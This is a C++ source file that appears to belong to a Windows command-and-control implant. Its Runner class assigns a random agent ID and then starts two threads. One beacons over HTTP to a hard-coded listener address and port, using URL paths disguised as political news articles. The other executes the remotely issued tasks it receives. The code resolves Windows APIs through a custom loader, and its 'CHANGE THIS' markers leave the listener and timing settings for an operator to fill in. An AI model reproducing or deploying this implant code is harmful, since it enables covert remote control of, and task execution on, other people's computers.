#include <Windows.h>
#include "utils/buffer.h"
#include "utils/winapi.h"
#include "runner/runner.h"
#include "communicators/base.h"
#include "communicators/http.h"
#include "utils/random.h"
#include "utils/queue.h"
#include "utils/event.h"
#include "executor/executor.h"

/* Constructor */
Runner::Runner()
    : winApiCustom(WinApiCustom()),
      pAgentId(NULL),
      TaskInputQueue(Queue()),
      TaskOutputQueue(Queue()),
      eventRegister(Event()),
      eventAgentShouldStop(Event())
{
    // Generate and set Agent ID
    this->pAgentId = (PCHAR)this->winApiCustom.HeapAllocCustom(7); // 6 characters + 1 null-byte
    if (this->pAgentId != NULL)
    {
        RandomGenerator randomGenerator = RandomGenerator(&this->winApiCustom);
        randomGenerator.GenerateRandomStr(6, this->pAgentId);
    }

    // Setup events
    this->eventRegister = Event(&winApiCustom);
    this->eventAgentShouldStop = Event(&winApiCustom);

    // Setup Task Input and Output queues
    this->TaskInputQueue = Queue(&winApiCustom, TRUE);
    this->TaskOutputQueue = Queue(&winApiCustom, TRUE);
}

/* Destructor */
Runner::~Runner()
{
    // Free heap for Agent ID
    if (this->pAgentId != NULL)
        this->winApiCustom.HeapFreeCustom(this->pAgentId);

    // Close events
    this->eventRegister.~Event();
}

void Runner::Run()
{
    // Start Communicator thread
    HttpCommunicatorThreadArgs httpCommunicatorThreadArgs;
    httpCommunicatorThreadArgs.agentId = this->pAgentId;
    httpCommunicatorThreadArgs.listenerHost = "172.25.76.217";                                                                                                                                    // CHANGE THIS
    httpCommunicatorThreadArgs.listenerPort = 8080;                                                                                                                                               // CHANGE THIS
    httpCommunicatorThreadArgs.pUrlPathChoices = "/politics/congress-investigates-allegations-of-foreign-interference\x00/politics/new-study-reveals-stark-disparities-in-healthcare-access\x00"; // CHANGE THIS
    httpCommunicatorThreadArgs.pWinApiCustom = &(this->winApiCustom);
    httpCommunicatorThreadArgs.pTaskInputQueue = &(this->TaskInputQueue);
    httpCommunicatorThreadArgs.pTaskOutputQueue = &(this->TaskOutputQueue);
    httpCommunicatorThreadArgs.pEventRegister = &(this->eventRegister);
    httpCommunicatorThreadArgs.pEventAgentShouldStop = &(this->eventAgentShouldStop);
    httpCommunicatorThreadArgs.communicationIntervalMs = 10 * 1000; // CHANGE THIS

    HANDLE hThreadCommunicator = this->winApiCustom.CreateThreadCustom(
        (LPTHREAD_START_ROUTINE)(HttpCommunicator::StartCommunicatorThread),
        &httpCommunicatorThreadArgs);
    if (hThreadCommunicator == NULL)
        return;

    // Start Executor thread
    StartExecutorThreadParameters executorParameters;
    executorParameters.pEventRegister = &(this->eventRegister);
    executorParameters.pTaskInputQueue = &(this->TaskInputQueue);
    executorParameters.pTaskOutputQueue = &(this->TaskOutputQueue);
    executorParameters.pWinApiCustom = &(this->winApiCustom);
    executorParameters.pEventAgentShouldStop = &(this->eventAgentShouldStop);
    executorParameters.waitTimeForRegistrationMs = 30 * 1000; // CHANGE THIS
    executorParameters.agentId = this->pAgentId;
    executorParameters.executorIntervalMs = 5 * 1000; // CHANGE THIS

    HANDLE hThreadExecutor = this->winApiCustom.CreateThreadCustom(
        (LPTHREAD_START_ROUTINE)(Executor::StartExecutorThread),
        &executorParameters);
    if (hThreadExecutor == NULL)
        return;

    // Wait for all threads to close, then close their handles
    this->winApiCustom.loadedFunctions.WaitForSingleObject(hThreadExecutor, INFINITE);
    this->winApiCustom.loadedFunctions.CloseHandle(hThreadExecutor);

    this->winApiCustom.loadedFunctions.WaitForSingleObject(hThreadCommunicator, INFINITE);
    this->winApiCustom.loadedFunctions.CloseHandle(hThreadCommunicator);
}